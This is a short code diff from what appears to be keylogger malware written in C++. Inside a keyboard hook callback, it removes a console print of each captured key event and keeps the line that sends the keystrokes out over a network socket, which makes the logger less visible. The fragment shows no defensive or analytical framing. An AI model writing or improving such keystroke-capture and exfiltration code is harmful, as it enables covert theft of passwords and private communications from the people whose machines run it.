@@ -249,7 +249,6 @@ LRESULT CALLBACK KeyLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
 		}
 	}
 
-	std::cout << key_event;
 	send(_keyboardSock, key_event.c_str(), key_event.length(), 0);
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
